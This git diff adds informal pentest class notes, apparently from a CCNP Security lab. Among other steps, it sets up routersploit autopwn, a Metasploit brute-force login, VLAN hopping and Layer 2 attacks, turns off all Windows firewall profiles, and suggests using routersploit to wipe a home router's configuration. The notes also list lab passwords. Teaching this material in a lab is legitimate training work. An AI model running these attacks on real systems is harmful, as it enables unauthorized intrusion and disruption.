@@ -1,0 +1,313 @@
+CREATE GITHUB ACCOUNT
+
+https://github.com/
+
+REDHAT LINUX
+
+https://www.redhat.com/
+
+CCNP Security: ccna + ccna Security + CCNP security
+
+2020: CCNP Security: Scor 350-701: 400 +
+                     Cisco FirePower: Fortinet,PaloAlto,Cisco FP
+                     Cisco ISE: 100%, Tacacs,Radius
+                     Cisco Security Program
+                     Cisco VPN
+task four ports:
+
+imap = 143
+pop3 = 110
+smtp = 25
+
+WindowsServer:
+administrator
+C1sc0123
+
+Linux:
+Kali/Parrot:
+kali
+C1sc0123
+
+TASK2:
+
+git clone https://github.com/rivancorp/ccnpsecday1 
+
+
+TASK3: BUILDING SWITCHING NETWORK:
+
+stp attacks
+arp spoofing
+mac spoofing
+MAC overflows
+cdp/lldp recon
+vlan hopping
+dhcp spoofing/Overload
+
+TASK4: NO linux, No cyberSec career:
+ip addr vs   ifconfig
+
+give temporary IP for linux:
+
+"root access"
+sudo su
+
+ifconfig eth0 10.m.1.69 netmask 255.255.255.0
+ip addr
+ping 10.m.1.4
+
+TASK5:
+ncpa.cpl:  palit ip bilis
+
+ifconfig /flushdns   :kuha internet agad
+
+services.msc:   lahat Andito
+
+compmgmt.msc:   computer management
+
+devmgmt.msc:  device manager:
+
+route add _____  mask 255.255.255.0 ____
+route add 10.0.0.0 mask 255.0.0.0  10.12.1.4
+route add 200.0.0.0 mask 255.255.255.0 10.12.1.4
+route print
+
+route delete ____
+
+route print
+
+TASK6: IT Career LINUX survival: 
+Cloud/AI, LinuxAWS,cloud.
+
+ping www.cisco.com
+apt-get install yersinia
+"all the Layer 2 hacking commands"
+
+yersinia -G
+
+Install ssh on Linux, for windows RemoteManagement:
+
+pwd
+mkdir  -p  /etc/ssh/original_keys
+
+ls -l
+
+mv  /etc/ssh/ssh_host_*  /etc/ssh/original_keys
+
+cd  /etc/ssh
+
+dpkg-reconfigure  openssh-server
+
+service ssh start
+
+service ssh  restart
+
+Task7: Install Exploits in Kali to attack Cisco/otherDevicxes
+
+python
+import sys
+print(sys.version)
+exit()
+whoami
+sudo  su
+apt-get  install  python3-pip
+ls
+git  clone  https://github.com/threat9/routersploit
+ls -l routersploit
+cd  routersploit
+ls
+python3  -m  pip  install  -r  requirements.txt
+python3  rsf.py
+
+show all
+search  cisco
+search  device=cameras
+search scanners
+use  scanners/autopwn
+set  target  10.12.1.4
+run
+
+CoreBABA:
+config t
+ip http authentication local
+username admin privilege 15 password C1sc0123
+ip http server
+line vty 0 14
+ login local
+ transport input all
+ password pass
+
+firefox:
+http://10.m.1.4
+
+Linux EndTask/Kill process
+
+ps  -aux   grep 'msf*'
+
+kill -9  _______
+
+pwd
+ls
+cd ..
+pwd
+git  clone  https://github.com/rivancorp/lisa
+
+BruteForceAttack: via metasploit
+
+msfconsole
+show all
+show exploits
+use  auxiliary/scanner/http/http_login
+show options
+set  BRUTEFORCE_SPEED  5
+set  HttpUsername  admin
+set  PASS_FILE /home/kali/lisa/2023-200_most_umssssed_passwords.txt
+set  RHOSTS  10.m.1.4
+set  RPORT   80
+set  STOP_ON_SUCCESS  true
+run
+
+TASK8: Cisco CoreSwitch/Layer2 Attacks:
+
+Make your Victims Strenth --> weakness
+Network Juisitsu:
+
+Strenth: Switch TrunkPorts:
+Make fa0/11 and fa0/12 Trunk:
+TAAS/BABA:
+Config t
+int Range fa0/11-12
+ switchport trunk encap Dot1Q
+ switchport mode trunk
+end
+show int trunk
+Condition: trunks only work with Cisco SW/APs
+
+purpose: trunks: VTP: vlan trunking protocol
+Taas/BABA:
+config t
+vtp domain ccnp
+vtp password security
+vtp version 1
+vtp mode server
+
+Attacking CoreSwitches:
+
+#sudo su
+#yersinia  -G
+
+TASK9: vlan hopping, kali will magically be in vlan 50
+to try to hack the cameras:
+
+modprobe 8021q
+vconfig add eth0 50
+ifconfig eth0.50 up
+ifconfig eth0.50 10.m.50.69 up
+ping 10.m.50.8
+
+nmap -v 10.m.50.8
+
+TASK10: SCAN all your victims:
+kali1:
+nmap -sP 10.m.100.0/24
+
+kali2:
+nmap -sP 10.m.1.0/24
+
+TASK11: DOS: denial of Service:
+1. Ping of Death
+2. Syn Flood
+3. "CPU overload" using cdp flood -> cisco attack.
+
+TASK12: Switch MAC address Flooding./ DHCP server Attack:
+
+TASK13: Virtualization of Servers:
+learn how to penetration Windows Server 2022 and 
+RedhatEnterpise.
+Penetration Tester/VAPT:
+- fave:blue,black,MMA,NBA.CR=take
+vs
+
+CEH/EH: 
+pink,MMK,MissUniverse,upo
+
+cmd
+powershell
+Set-NetFirewallProfile  -name  domain,private,public -enabled false
+
+pentest window
+una:
+kali#ping 10.m.1.8
+
+nmap -v 10.m.1.10
+21,25,53,80,110,135,139,143,445,587
+
+nmap -v 10.m.1.8
+135,139,445
+Hacking/CyberSecurity/PentestFundamentals:
+What is a file server, how to hackit:
+NAS,network attached storage,file server, SMB server.= 139 + 445
+
+3 way handshake: SUPER fcking IMportant in CyberSec:
+to Enter a victim: SOCKET connection: IP + Port
+
+hacker                    victim
+10.m.1.69              10.m.1.10,  10.m.1.8
+
+    10.m.1.8               10.m.1.10
+sip: 1.8
+dip: 1.10
+sp: 5xxxx
+dp: 139,445
+netstat -s  -p  tcp      netstat -s  -p  tcp
+
+What is CIA: Confidentility, Integrity, Availability of Data/Info
+
+Confidentiality:
+-1st goal:
+- data is not visible to just anyone and protect data i storage or in motion
+  thus protecting business data.
+- data is for intended and authorized persons
+- encryption protects: data/system confidentiality
+- RAS and S2S VPN protects data in transit
+
+Integrity:
+-Ensures maintaining and assuring accuracy of consistent data
+-Ability to make sure that has not been altered or changed/data is Orig!
+-data recieved is the SAMe as the data sent by the sender
+
+Availability:
+- systems, Applications, Data must be avialable to users
+- resilient systems, virtualization, clustering, enviromentalt controls
+  and incident response
+
+
+Sunday-Monday:
+1. install vmware 17 + license keys
+2. install secureCRT8.1 0r putty
+3. INstall kali2023 in vmware
+4. Use putty to talk Kali:
+mkdir –p /etc/ssh/original_keys
+
+mv /etc/ssh/ssh_host_* /etc/ssh/original_keys
+
+cd /etc/ssh
+
+dpkg-reconfigure openssh-server
+
+service ssh start
+
+service ssh restart
+
+5. install python3pip
+6. install routersploit
+7. enter your homeFiber router, delete the configs.
+   using routersploit
+
+
+
+
+
+
+
+
+
